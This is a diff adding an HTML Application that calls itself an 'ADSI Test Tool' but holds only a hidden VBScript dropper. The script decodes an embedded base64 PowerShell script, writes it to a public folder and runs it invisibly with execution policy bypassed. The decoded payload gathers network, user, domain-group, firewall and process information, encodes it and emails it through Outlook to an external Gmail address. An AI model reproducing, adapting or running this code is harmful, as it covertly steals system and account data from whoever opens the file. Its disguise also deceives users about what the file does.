@@ -1,0 +1,80 @@
+<HTML>
+	<HEAD>
+		<HTA:APPLICATION 
+			ID="ADSITest"
+			VERSION="0.20 Beta"
+			APPLICATIONNAME="ADSI Test Tool"
+			SYSMENU="yes"
+			MAXIMIZEBUTTON="yes"
+			MINIMIZEBUTTON="yes"
+			BORDER="thin"
+			INNERBORDER="no"
+			SCROLL="auto"
+			SINGLEINSTANCE="yes"
+			WINDOWSTATE="minimize"
+		>
+	</HEAD>
+<script language="VBScript">
+
+function WriteToTextFile(infilepath, inContent)
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	objFSO.CreateTextFile infilepath, True
+	Set objFileIn   = objFSO.GetFile(infilepath)
+	Set objStreamIn = objFileIn.OpenAsTextStream(2, 0)
+	objStreamIn.Write(inContent)
+	set objStreamIn = Nothing
+	set objFileIn = Nothing
+	set objFSO = Nothing
+end function
+
+Function base64_decode(encodedstr)
+    Const r64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    Dim table(256), decodedstr
+    For x = 1 To 256 Step 1
+        table(x) = -1
+    Next
+    For x = 1 To 64 Step 1
+        table(1 + Asc(Mid(r64, x, 1))) = x - 1
+    Next
+    Dim size
+    size = Len(encodedstr)
+    bits = 0
+    decodedstr = ""
+    For x = 1 To size Step 1
+        c = table(1 + Asc(Mid(encodedstr, x, 1)))
+        If (c <> -1) Then
+            If (bits = 0) Then
+                outword = c * 4
+                bits = 6
+            ElseIf (bits = 2) Then
+                outword = c + outword
+                decodedstr = decodedstr & (Chr(CLng("&H" & Hex(outword Mod 256))))
+                bits = 0
+            ElseIf (bits = 4) Then
+                outword = outword + Int(c / 4)
+                decodedstr = decodedstr & (Chr(CLng("&H" & Hex(outword Mod 256))))
+                outword = c * 64
+                bits = 2
+            Else
+                outword = outword + Int(c / 16)
+                decodedstr = decodedstr & (Chr(CLng("&H" & Hex(outword Mod 256))))
+                outword = c * 16
+                bits = 4
+            End If
+        End If
+    Next
+    base64_decode = decodedstr
+End Function
+
+a="I2luZm9ybWF0aW9uIGdhdGhlcmluZw0KJGRhdGU9ZGF0ZQ0KJGlwY29uZmlnMT1pcGNvbmZpZw0KJGlwY29uZmlnPWlwY29uZmlnIC9hbGwgDQokaXBjb25maWcyPWlwY29uZmlnIC9kaXNwbGF5ZG5zDQokbmV0c3RhdD1uZXRzdGF0IC1hbm8gDQokbmV0c3RhdDI9bmV0c3RhdCAtcg0KJG5ldHNoYXJlPW5ldCBzaGFyZQ0KJG5ldHVzZXI9bmV0IHVzZXINCiRDb21wdXRlck5hbWU9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0JJT1MgLUNvbXB1dGVyTmFtZSAuDQokc3lzdGVtaW5mbz1zeXN0ZW1pbmZvDQokZmlyZXdhbGw9bmV0c2ggZmlyZXdhbGwgc2hvdyBjb25maWcNCiRhcnA9YXJwIC1hIA0KJHRhc2tsaXN0PXRhc2tsaXN0IC9zdmMNCiRuZXR1c2VyMj1uZXQgdXNlciAvZG9tYWluDQokbmV0Z3JvdXA9bmV0IGdyb3VwIC9kb21haW4NCg0KJGFsbD0kZGF0ZSwkaXBjb25maWcsJGlwY29uZmlnMiwkbmV0c3RhdCwkbmV0c3RhdDIsJG5ldHNoYXJlLCRzeXN0ZW1pbmZvLCRmaXJld2FsbCwkYXJwLCR0YXNrbGlzdCwkbmV0dXNlciwkbmV0Z3JvdXAsJG5ldGdyb3VwMiwkbmV0Z3JvdXAzLCRmaXJld2FsbCwkbmV0Z3JvdXA0fCBvdXQtc3RyaW5nDQokc21hbGw9JGlwY29uZmlnMSwkZGF0ZSwkZmlyZXdhbGwsJG5ldHVzZXJ8IG91dC1zdHJpbmcNCg0KaWYgKCRzbWFsbC5sZW5ndGggLWd0IDEwMDApIHsNCiAgICBlY2hvICJQYmxhYmxhYmxibGJsYiINCn0NCg0KRnVuY3Rpb24gQmFzZTY0RW5jb2RlKCR0ZXh0KSANCnsNCiAgICAkYiAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR0ZXh0KQ0KICAgICRlbmNvZGVkID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGIpDQogICAgcmV0dXJuICRlbmNvZGVkICAgIA0KfQ0KDQoNCkZ1bmN0aW9uIE1haWwoJHRleHQyKQ0Kew0KJE91dGxvb2sgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgT3V0bG9vay5BcHBsaWNhdGlvbg0KJE1haWwgPSAkT3V0bG9vay5DcmVhdGVJdGVtKDApDQokTWFpbC5UbyA9ICJsaW1vcjc3NjNAZ21haWwuY29tIg0KJE1haWwuU3ViamVjdCA9ICJBY3Rpb24iDQokTWFpbC5Cb2R5ID0iJHRleHQyIg0KJE1haWwuU2VuZCgpDQp9DQoNCiRFbmNvZGVkID0gQmFzZTY0RW5jb2RlKCRhbGwpDQokRW5jb2RlZDIgPSBCYXNlNjRFbmNvZGUoJHNtYWxsKQ0KJEVuY29kZWQxMDAwPSRFbmNvZGVkMi5TdWJzdHJpbmcoMCw5OTkpDQpNYWlsKCRFbmNvZGVkMTAwMCkNCk1haWwoJEVuY29kZWQpDQojYWxsIGNvcHlyaWdodCByZXNlcnZlZCB0byBMaW9yIEFkYXIgYW5kIFdoaXRlLUhhdCBjb21wYW55Ijs="
+	
+	
+	
+WriteToTextFile "C:\Users\Public" & "\player.ps1", base64_decode(a)
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -exec bypass -file " & "C:\Users\Public" & "\player.ps1", 0, false
+	
+</script>
+<body>
+</body>
+</HTML>
